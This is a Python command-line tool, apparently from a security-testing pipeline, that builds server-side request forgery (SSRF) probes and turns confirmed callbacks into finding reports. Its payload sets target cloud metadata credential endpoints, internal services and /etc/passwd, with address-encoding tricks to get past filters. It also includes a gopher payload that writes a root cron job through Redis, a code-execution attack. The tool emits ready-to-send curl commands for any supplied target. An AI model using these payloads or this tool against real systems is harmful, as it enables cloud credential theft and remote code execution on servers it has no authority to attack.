#!/usr/bin/env python3
"""ssrf_probe.py - generate SSRF probe sets, work units, and findings.report payloads.

Subcommands:
  gen         Build ready-to-send probe URLs/requests for one endpoint+param.
  work-units  Filter candidate URLs (stdin or -i file) into a rupu work-units array.
  finding     Turn a confirmed interactsh callback into a findings.report payload.

Examples:
  python3 scripts/ssrf_probe.py gen -u "https://example.com/fetch?url=FUZZ" \
      -c cbg3abc.oast.pro --sets oob,localhost,metadata,encodings,gopher \
      -o probes.json --curl --work-units units.json
  cat urls.txt | python3 scripts/ssrf_probe.py work-units --work-units units.json
  python3 scripts/ssrf_probe.py finding --url "https://example.com/fetch?url=" \
      --param url --payload "http://cbg3abc.oast.pro/p1" \
      --interactions interactsh.jsonl --severity high -o finding.json

Stdlib only. -- vulture (sage-ferry)
"""
import argparse
import json
import re
import sys
import urllib.parse

CANDIDATE_PARAMS = re.compile(
    r"^(url|uri|u|dest|destination|redirect|next|target|image|img|src|source|feed|"
    r"rss|webhook|callback|proxy|fetch|file|path|page|load|link|site|host|domain|"
    r"preview|open|window|data|reference|api|endpoint|continue|return|to|out|view|"
    r"dir|show|navigation|document|template)$",
    re.I,
)

REDIS_CRON = (
    "gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0A"
    "set%0D%0A%241%0D%0A1%0D%0A%2434%0D%0A%0A%0A%2A/1 * * * * id > /tmp/ssrf%0A%0A"
    "%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A"
    "%2416%0D%0A/var/spool/cron/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset"
    "%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%241%0D%0A%244%0D%0Asave%0D%0A"
)


def payload_sets(cb, marker):
    cb = cb or "cbg3abc.oast.pro"
    m = marker or "m1"
    return {
        "oob": [
            "http://%s/%s" % (cb, m),
            "https://%s/%s" % (cb, m),
            "//%s/%s" % (cb, m),
            "http://%s:443/%s" % (cb, m),
            "dict://%s:80/%s" % (cb, m),
        ],
        "localhost": [
            "http://127.0.0.1/", "http://127.0.0.1:80/", "http://127.0.0.1:443/",
            "http://127.0.0.1:22/", "http://127.0.0.1:6379/", "http://127.0.0.1:8080/",
            "http://127.0.0.1:9200/", "http://127.0.0.1:2375/containers/json",
            "http://127.0.0.1:8500/v1/kv/?recurse",
            "http://localhost/", "http://0.0.0.0/", "http://0/", "http://[::1]/",
            "http://10.0.0.1/", "http://172.16.0.1/", "http://192.168.0.1/",
        ],
        "metadata": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://169.254.169.254/latest/user-data/",
            "http://169.254.169.254/latest/dynamic/instance-identity/document",
            "http://aws.oast.fun/latest/meta-data/",
            "http://alibaba.oast.fun/latest/meta-data/",
            "http://100.100.100.200/latest/meta-data/",
            "http://metadata.google.internal/computeMetadata/v1/?recursive=true",
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "http://169.254.169.254/metadata/v1.json",
            "http://169.254.170.2/v2/credentials/",
        ],
        "encodings": [
            "http://2130706433/", "http://0177.0.0.1/", "http://017700000001/",
            "http://0x7f000001/", "http://0x7f.0x0.0x0.0x1/", "http://127.1/",
            "http://[::ffff:127.0.0.1]/", "http://[0:0:0:0:0:ffff:127.0.0.1]/",
            "http://127.0.0.1./", "http://127.0.0.1.nip.io/",
            "http://2852039166/", "http://0xa9fea9fe/", "http://0251.0376.0251.0376/",
            "http://169.254.169.254.nip.io/latest/meta-data/",
            "http://[fd00:ec2::254]/latest/meta-data/",
            "http://example.com@127.0.0.1/", "http://127.0.0.1#@example.com/",
            "http://example.com%2509@127.0.0.1/", "http://example.com\\@127.0.0.1/",
        ],
        "gopher": [
            "file:///etc/passwd",
            "file:///proc/self/environ",
            "dict://127.0.0.1:6379/info",
            REDIS_CRON,
            "gopher://127.0.0.1:9000/_",  # FastCGI stub - fill with generated payload
        ],
    }


def inject(url, param, payload):
    """Place payload into url: replace FUZZ marker, or set/append query param."""
    if "FUZZ" in url:
        return url.replace("FUZZ", urllib.parse.quote(payload, safe=""))
    parts = urllib.parse.urlsplit(url)
    q = urllib.parse.parse_qsl(parts.query, keep_blank_values=True)
    q = [(k, v) for (k, v) in q if k != param] + [(param, payload)]
    return urllib.parse.urlunsplit(
        (parts.scheme, parts.netloc, parts.path,
         urllib.parse.urlencode(q, quote_via=urllib.parse.quote), parts.fragment))


def unit_id(url, param, prefix="ssrf"):
    host = urllib.parse.urlsplit(url).netloc or "unknown"
    path = urllib.parse.urlsplit(url).path.strip("/").replace("/", "-") or "root"
    return "%s-%s-%s-%s" % (prefix, host, path, param)


def make_unit(url, param, method="GET"):
    base = urllib.parse.urlsplit(url)
    fuzz = inject(url, param, "FUZZ").replace("FUZZ", "FUZZ")
    return {
        "id": unit_id(url, param),
        "title": "SSRF candidate: %s @ %s://%s%s" % (
            param, base.scheme or "https", base.netloc, base.path),
        "targets": [fuzz],
        "hints": {
            "param": param,
            "method": method,
            "vuln_class": "ssrf",
            "cwe": "CWE-918",
            "wstg": "WSTG-INPV-19",
            "next_step": "ssrf_probe.py gen with interactsh callback; send probes; "
                         "watch interactsh.jsonl for dns/http hits",
        },
    }


def cmd_gen(a):
    sets = payload_sets(a.callback, a.marker)
    wanted = [s.strip() for s in a.sets.split(",")] if a.sets else list(sets)
    probes = []
    for name in wanted:
        for p in sets.get(name, []):
            entry = {"set": name, "payload": p, "param": a.param, "method": a.method}
            if a.data and "FUZZ" in a.data:
                entry["url"] = a.url
                entry["body"] = a.data.replace("FUZZ", urllib.parse.quote(p, safe=""))
            else:
                entry["url"] = inject(a.url, a.param, p)
            if a.curl:
                c = ["curl", "-sk", "-X", a.method]
                for h in a.header or []:
                    c += ["-H", "'%s'" % h]
                if entry.get("body"):
                    c += ["--data", "'%s'" % entry["body"]]
                c.append("'%s'" % entry["url"])
                entry["curl"] = " ".join(c)
            probes.append(entry)
    out = json.dumps(probes, indent=2)
    if a.output:
        open(a.output, "w").write(out + "\n")
        print("[+] wrote %d probes -> %s" % (len(probes), a.output), file=sys.stderr)
    else:
        print(out)
    if a.work_units:
        units = [make_unit(a.url, a.param, a.method)]
        open(a.work_units, "w").write(json.dumps(units, indent=2) + "\n")
        print("[+] wrote %d work unit(s) -> %s" % (len(units), a.work_units),
              file=sys.stderr)


def cmd_work_units(a):
    lines = (open(a.input) if a.input else sys.stdin).read().splitlines()
    units, seen = [], set()
    for line in lines:
        line = line.strip()
        if not line or not line.lower().startswith(("http://", "https://")):
            continue
        parts = urllib.parse.urlsplit(line)
        for k, _ in urllib.parse.parse_qsl(parts.query, keep_blank_values=True):
            if not CANDIDATE_PARAMS.match(k):
                continue
            key = (parts.netloc, parts.path, k)
            if key in seen:
                continue
            seen.add(key)
            units.append(make_unit(line, k))
    out = json.dumps(units, indent=2)
    if a.work_units:
        open(a.work_units, "w").write(out + "\n")
        print("[+] %d candidate param(s) -> %s" % (len(units), a.work_units),
              file=sys.stderr)
    else:
        print(out)


def cmd_finding(a):
    interactions = []
    if a.interactions:
        for line in open(a.interactions):
            line = line.strip()
            if not line:
                continue
            try:
                j = json.loads(line)
            except ValueError:
                continue
            if a.match and a.match not in json.dumps(j):
                continue
            interactions.append({k: j.get(k) for k in
                                 ("protocol", "full-id", "raw-request",
                                  "remote-address", "timestamp") if k in j})
    protos = sorted({i.get("protocol") for i in interactions if i.get("protocol")})
    rationale = (
        "The %s parameter at %s is fetched server-side without validation. "
        "Injecting %s produced %s interaction(s) on the out-of-band listener "
        "(%s), proving the server issues attacker-controlled requests (CWE-918)."
        % (a.param, a.url, a.payload,
           "/".join(protos) if protos else "out-of-band",
           ", ".join(sorted({i.get("remote-address", "?") for i in interactions}))
           if interactions else "see attached log"))
    if a.rationale:
        rationale = a.rationale
    finding = {
        "title": a.title or "SSRF in %s parameter (OOB-confirmed) at %s" % (
            a.param, urllib.parse.urlsplit(a.url).path or "/"),
        "scope": "endpoint",
        "target_ref": a.url,
        "severity": a.severity,
        "classification": {"cwe": "CWE-918", "wstg": "WSTG-INPV-19"},
        "evidence": {
            "rationale": rationale,
            "request": a.request or "%s %s HTTP/1.1\r\nHost: %s\r\n\r\n" % (
                a.method, inject(a.url, a.param, a.payload),
                urllib.parse.urlsplit(a.url).netloc),
            "response": a.response or "(blind sink - see oob_interactions)",
            "oob_interactions": interactions,
        },
    }
    out = json.dumps(finding, indent=2)
    if a.output:
        open(a.output, "w").write(out + "\n")
        print("[+] findings.report payload -> %s" % a.output, file=sys.stderr)
    else:
        print(out)


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    g = sub.add_parser("gen", help="generate probe set for one endpoint")
    g.add_argument("-u", "--url", required=True,
                   help='target URL; use FUZZ marker or supply --param')
    g.add_argument("-p", "--param", default="url", help="parameter to inject")
    g.add_argument("-c", "--callback", help="interactsh payload host (id.oast.pro)")
    g.add_argument("--marker", help="unique OOB path marker for attribution")
    g.add_argument("--sets", help="comma list: oob,localhost,metadata,encodings,gopher")
    g.add_argument("-X", "--method", default="GET")
    g.add_argument("-d", "--data", help="request body template containing FUZZ")
    g.add_argument("-H", "--header", action="append", help="header for curl output")
    g.add_argument("--curl", action="store_true", help="include curl command per probe")
    g.add_argument("-o", "--output", help="write probes JSON here")
    g.add_argument("--work-units", help="also write a 1-element work-units array")
    g.set_defaults(func=cmd_gen)

    w = sub.add_parser("work-units", help="candidate URLs -> rupu work-units array")
    w.add_argument("-i", "--input", help="file of URLs (default stdin)")
    w.add_argument("--work-units", help="output JSON array file (default stdout)")
    w.set_defaults(func=cmd_work_units)

    f = sub.add_parser("finding", help="confirmed callback -> findings.report payload")
    f.add_argument("--url", required=True, help="affected endpoint URL (target_ref)")
    f.add_argument("--param", required=True)
    f.add_argument("--payload", required=True, help="the payload that triggered the hit")
    f.add_argument("--interactions", help="interactsh -json -o file (jsonl)")
    f.add_argument("--match", help="only include interactions containing this string "
                                   "(e.g. the per-param marker)")
    f.add_argument("--severity", default="high",
                   choices=["info", "low", "medium", "high", "critical"])
    f.add_argument("--title")
    f.add_argument("--rationale")
    f.add_argument("--request", help="full raw HTTP request actually sent")
    f.add_argument("--response", help="raw HTTP response from the sink")
    f.add_argument("-X", "--method", default="GET")
    f.add_argument("-o", "--output")
    f.set_defaults(func=cmd_finding)

    a = ap.parse_args()
    a.func(a)


if __name__ == "__main__":
    main()
